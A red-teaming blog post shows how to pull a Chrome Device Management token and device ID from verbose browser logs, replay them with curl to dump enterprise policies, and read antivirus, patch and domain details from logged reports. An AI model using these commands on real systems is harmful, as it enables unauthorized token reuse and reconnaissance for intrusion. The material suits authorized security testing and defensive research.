---
layout: post
title: Dumping Enterprise Chrome Policies Using Device Management Tokens from Verbose Logs
description: I’ll walk through post-compromise enumeration techniques to extract valuable information from verbose Chrome logs
date: 2026-07-16T12:00:00Z
categories:
  - red-teaming
tags:
  - chrome
image_alt:
author: Drew Alleman
last_modified_at: 2026-07-16T12:00:00Z
---
In this blog post, I’ll walk through post-compromise enumeration techniques to extract valuable information from verbose Chrome logs, including:
- **Cloud Device ID** and **Device Management Token** — which can be used to dump full Enterprise Chrome OS / Browser cloud policies
- Antivirus products and their status
- OS version (including installed hotfixes)
- Firewall status
- Windows domain

>Why This Matters: This method allows red teamers (and security researchers) to enumerate host information without relying on native tools or commands like wmic, PowerShell, netstat, or systeminfo. 
## Finding the Device ID and Device Management Token
Launching Chrome with verbose logging shows a device management token and a device ID. I'll run the browser headless and dump the output to a local file, specifying my enrolled enterprise profile (`Profile 1`)."

```
PS C:\Users\dr.reynolds> rm C:\Users\dr.reynolds\chrome_debug.log

PS C:\Users\dr.reynolds> Start-Process chrome.exe -ArgumentList @(
    '--user-data-dir="C:\Users\dr.reynolds\AppData\Local\Google\Chrome\User Data"',
    '--profile-directory="Profile 1"',
    '--enable-logging',
    '--v=1',
    '--log-file=C:\Users\dr.reynolds\chrome_debug.log',
    '--headless'
)
```

In the output we can see our device id, and device management token. In my 24hs of testing I never had the token expire.
![[Pasted image 20260715223910.png]]
## Querying Enterprise Policies
Dumping the enterprise policies from here isn't exactly a straightforward process. Chromium uses protocol buffers, a compact binary format, to talk to the Device Management (DM) server and many other components. The message definitions live in Chromium's public `.proto` files, which is how we know what every byte maps to. Protobuf never puts field names on the wire, only numbers: each field is written as a tag byte or bytes (packing the field number and the value's wire type) followed by the value, so the stream is a repeating pattern of tag → length → data.

To make our cURL request, we need to hand the server a serialized protobuf. In this case we will be making a `DeviceManagementRequest` with its `policy_request`field populated. The three messages we care about are defined in `device_management_backend.proto` (comments added to map each field to the bytes we'll build):

```protobuf
// (1) The outer routing envelope. Every DMServer request is one of these.
message DeviceManagementRequest {
  optional DeviceRegisterRequest    register_request   = 1;
  optional DeviceUnregisterRequest  unregister_request = 2;
  optional DevicePolicyRequest      policy_request     = 3;   // <-- our 1a (field 3)
  // ... many other request types (status_report, remote_command, reports, ...)
}

// (2) A policy fetch can ask for several types at once, so it's a list.
message DevicePolicyRequest {
  repeated PolicyFetchRequest requests = 3;                   // <-- our 1a (field 3)
  enum Reason { UNSPECIFIED = 0; DEVICE_ENROLLMENT = 1; /* ... */ USER_REQUEST = 21; }
  optional Reason reason = 4;
}

// (3) One requested policy type (plus options we don't send).
message PolicyFetchRequest {
  optional string policy_type = 1;                            // <-- our 0a (field 1) = "google/chrome/user"
  optional int64  timestamp   = 2;
  enum SignatureType { NONE = 0; SHA1_RSA = 1; SHA256_RSA = 2; }
  optional SignatureType signature_type = 3 [default = NONE];
  optional int32  public_key_version = 4;
  optional string settings_entity_id = 6;
  // ... more fields
}
```

Only `policy_request` (field 3) gets populated; the other request types stay empty. Building the body inside-out, `policy_request` holds a `DevicePolicyRequest`, which holds a repeated `PolicyFetchRequest`, which is where the `policy_type` string finally lands:

```
0a 12 "google/chrome/user"     PolicyFetchRequest.policy_type (field 1), 18 bytes
   1a 14 …                           DevicePolicyRequest.requests   (field 3), wraps the 20 bytes above
1a 16 …                              DeviceManagementRequest.policy_request (field 3), wraps the 22 bytes above
```

`1a16` on its own is just the _header_ of the outer message: `1a` is the tag (field 3, length-delimited) and `16` is the length — 22 bytes — of whatever we nest inside. We can't write that length until we know the contents, which is why protobuf is encoded from the inside out. Notice each layer's length byte (`12` → `14` → `16`) grows by exactly the 2 tag+length bytes the layer below adds.

Concatenated, the complete request body is 24 bytes:

```
1a161a140a12676f6f676c652f6368726f6d652f75736572
```

Broken down:

```
1a 16   1a 14   0a 12
└┬┘└┬┘  └┬┘└┬┘  └┬┘└┬┘
 │  │    │  │    │  └─ length: 18 bytes  (the string that follows)
 │  │    │  │    └──── tag: field 1, type 2  (policy_type)
 │  │    │  └───────── length: 20 bytes
 │  │    └──────────── tag: field 3, type 2  (requests)
 │  └───────────────── length: 22 bytes
 └──────────────────── tag: field 3, type 2  (policy_request)

          67 6f 6f 67 6c 65 2f 63 68 72 6f 6d 65 2f 75 73 65 72
          g  o  o  g  l  e  /  c  h  r  o  m  e  /  u  s  e  r
```

Note that field `3` appears twice — `policy_request` in the outer message and `requests` in the middle one — meaning two different things. A field number only has meaning inside its own message type; the schema is what disambiguates them.

You can produce those bytes without hand-assembling them:

```bash
$ printf '\x1a\x16\x1a\x14\x0a\x12google/chrome/user' > request.bin

$ xxd request.bin
00000000: 1a16 1a14 0a12 676f 6f67 6c65 2f63 6872  ......google/chr
00000010: 6f6d 652f 7573 6572                      ome/user
```
#### Example cURL
With the body in hand, we can query the DM server for the policies. The protobuf is only the request _body_; the credentials (DM token) and routing (device id, device type) live in the header and URL:
```bash
TOKEN='xxxx='
DID='xxx-xxx-xxx-xxx'

curl -X POST \
  -H "Authorization: GoogleDMToken token=$TOKEN" \
  -H 'Content-Type: application/x-protobuf' \
  --data-binary "$(printf '1a161a140a12676f6f676c652f6368726f6d652f75736572' | xxd -r -p)" \
  'https://m.google.com/devicemanagement/data/api?request=policy&deviceid='"$DID"'&devicetype=2&apptype=Chrome&agent=dmenum&platform=Linux' \
  -o /tmp/policy.bin -w 'HTTP %{http_code}\n'
```

If we run this command it dumps the policies the server returns to `/tmp/policy.bin` as a protobuf structure (a `DeviceManagementResponse`), which we decode the same way we'll decode the policy blob next.

**Public references**
- Current proto (contains `PolicyFetchRequest` and `DevicePolicyRequest`): [device_management_backend.proto](https://chromium.googlesource.com/chromium/src/+/HEAD/components/policy/proto/device_management_backend.proto) · [GitHub mirror](https://github.com/chromium/chromium/blob/main/components/policy/proto/device_management_backend.proto)
- Protocol explainer: [Protobuf-encoded policy blobs](https://www.chromium.org/developers/how-tos/enterprise/protobuf-encoded-policy-blobs/)

Displaying the dumped file reveals another protobuf structure.
```bash
cat /tmp/policy.bin
*�␦�␦�
google/chrome/user����3␦�YOUR_DM_TOKEN="��� *YOURGOOGLEDOMAIN.com�
                                                                                                                                 �
                                                                                                                                  ��1/{"applications":[],"playStoreMode":"BLACKLIST"}�����AW� �       �       �
                                         �

�����                                           Evil Corp�
disabled��:youruser@YOURGOOGLEDOMAIN.comB$YOUR_DEVICE_ID@xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�        C049dt7ie�%cs-xxxxxxxxxxxxxxxxxxxxxxx�xxxxxxxxxxxxxxxxxxxx��YOURGOOGLEDOMAIN.comRgoogle/chrome/user
```

We are able to convert this to a human readable format using `protoc`. We first need to download the publicly available protobuf structure that we talked about earlier and create a small stub to satisfy some import requirements. 
```
curl -L https://raw.githubusercontent.com/chromium/chromium/main/components/policy/proto/device_management_backend.proto \
  -o device_management_backend.proto

# write a stub that satisfies the import
cat > private_membership_rlwe.proto <<'EOF'
syntax = "proto2";
package private_membership.rlwe;

message PrivateMembershipRlweOprfRequest {}
message PrivateMembershipRlweOprfResponse {}
message PrivateMembershipRlweQueryRequest {}
message PrivateMembershipRlweQueryResponse {}
EOF
```

With these created we can use the following command to dump these policies to a json file.

```
protoc --proto_path=.   --decode=enterprise_management.DevicePolicyResponse   device_management_backend.proto < /tmp/policy.bin >> policies.json
```

Below is the contents of `policies.json`. But its still not fully readable, the policies are just numbers we still need ways to map these values to policies. 
```json
5 {
  3 {
    1: 200
    3 {
      1: "google/chrome/user"
      2: 1784175507022
      3: "DM_TOKEN"
      4 {
        95 {
          2: 1
        }
        149 {
          2: "*[ALLOWED_DOMAINS]"
        }
        189 {
          2: 0
        }
        202 {
          2: 1
        }
        319 {
          2: 1
        }
        320 {
          2: "{\"applications\":[],\"playStoreMode\":\"BLACKLIST\"}"
        }
        369 {
          2: 1
        }
        378 {
          2: 5
        }
        471 {
          2: 1
        }
        489 {
          2: 2
        }
        1043 {
          146 {
            2: 1
          }
          147 {
            2: 1
          }
          148 {
            2: 1
          }
          188 {
            2: 1
          }
          198 {
            2: "Evil Corp"
          }
          213 {
            2: 0
          }
          223 {
            2: 1
          }
          224 {
            2: 1
          }
          235 {
            2: 1
          }
          251 {
            2: 1
          }
          255 {
            2: 1
          }
          267 {
            2: "disabled"
          }
          307 {
            2: 1
          }
          308 {
            2: 1
          }
        }
      }
      7: "youruser@yourdomain"
      8: "yourdeviceid"
      15: "xxxxxxxxxxxxxxxxxxxxxxxx"
      24: "xxxxxxxxxxxxxxxxxx"
      26: "xxxxxxxxxxxxxxxxxxxxxx"
      29: "xxxxxxxxxxxxxxxxxxx"
      35: 4
      36: "yourdomain"
    }
    10: "google/chrome/user"
  }

```

Luckily, [Chromium's public source](https://github.com/chromium/chromium/blob/main/components/policy/resources/templates/policies.yaml) gives us `policies.yaml` a master index of every enterprise policy, mapping each policy's numeric **ID** to its name.

Here's one entry:
```yaml
93: IncognitoModeAvailability
```

And here's the matching entry in the decoded policy blob:
```json
95 {
  2: 1
}
```

At first glance the numbers don't line up — the policy has ID **93**, but it appears under field **95**. That's not an error. When Chromium generates the policy protobuf (`cloud_policy.proto`) from `policies.yaml`, it offsets every field number by a fixed amount. From [`generate_policy_source.py`](https://github.com/chromium/chromium/blob/main/components/policy/tools/generate_policy_source.py):

```python
RESERVED_IDS = 2                       # tags 1–2 are reserved in the wrapper proto
field_number = policy_id + RESERVED_IDS   # for top-level policies
```

So the rule is simply **field tag = policy ID + 2**: `93 + 2 = 95`. Reading the inner message, `2: 1` means sub-field `2` (the policy's **value**) is `1` — for `IncognitoModeAvailability` that's _Disabled_. (Sub-field `1`, when present, carries `policy_options`, the source/mode metadata.)

Ugh that was a lot, but luckily we can automate this workflow! [I created a basic C++ library](https://github.com/Drew-Alleman/dmenum) with a sample file that will dump the domain policies.

```
$ enumerate_policies xxxxxxxx= xxx-xxx-xxx-xxx google/chrome/user

  google/chrome/user  —  22 policies set  (22 enforced, 0 recommended)
  ----------------------------------------------------------------------

  Enable deleting browser and download history
      AllowDeletingBrowserHistory = false   →  Disable deleting browser and download history
      Setting the policy to Enabled or leaving it unset means browser history and download history can be deleted in Chrome,…

  Enable remote attestation for the user
      AttestationEnabledForUser = true   →  Enable remote attestation for the user
      This policy was removed in M118. It served to enable and disable Remote Attestation for the user but Remote Attestation…

  Incognito mode availability
      IncognitoModeAvailability = 1   →  Incognito mode disabled
      Specifies whether the user may open pages in Incognito mode in Google Chrome. If 'Enabled' is selected or the policy is…
      
  Set a custom enterprise label for a managed profile
      EnterpriseCustomLabel = Evil Corp
      This policy controls a custom label used to identify managed profiles. For managed profiles, this label will be shown…

<TRIMMED>....
```

## Enterprise Reports
Along with the device management token the log file also exposes raw enterprise reports which discloses the following information.
```json
{
   "Error": "No error found in report",
   "antivirus_info": [ {
      "display_name": "Microsoft Defender Antivirus",
      "state": "Off"
   }, {
      "display_name": "Avast Antivirus",
      "state": "On"
   } ],
   "attestation generation error": "Device Attestation is unsupported",
   "attestation nonce": "xxxxxxxxxxxxxxxxxxxx",
   "attestation timestamp": "xxxxxxxxxxxxxxxxxxxx",
   "browser_version": "150.0.7871.101",
   "built_in_dns_client_enabled": true,
   "bulk_data_entry_providers": [  ],
   "chrome_remote_desktop_app_blocked": false,
   "device_enrollment_domain": "",
   "device_manufacturer": "QEMU",
   "device_model": "Standard PC (Q35 + ICH9, 2009)",
   "disk_encryption": "Disabled",
   "display_name": "",
   "file_attached_providers": [  ],
   "file_downloaded_providers": [  ],
   "host_name": "",
   "hotfixes": [ "KB5087051", "KB5054156", "KB5078674", "KB5094126", "KB5094135" ],
   "mac_addresses": [  ],
   "machine_guid": "",
   "operating_system": "Windows",
   "os_firewall": "Enabled",
   "os_version": "10.0.26200.8655",
   "password_protection_warning_trigger": 3,
   "print_providers": [  ],
   "profile_enrollment_domain": "xxxxxxxxxxxxxxxxxxxx",
   "profile_id": "xxxxxxxxxxxxxxxxxxxx",
   "realtime_url_check_mode": 0,
   "safe_browsing_protection_level": 1,
   "screen_lock_secured": "Enabled",
   "secure_boot_mode": "Enabled",
   "security_event_providers": [  ],
   "serial_number": "",
   "site_isolation_enabled": true,
   "system_dns_servers": [  ],
   "windows_machine_domain": "DEADBEEF",
   "windows_user_domain": "DEADBEEF"
}
```
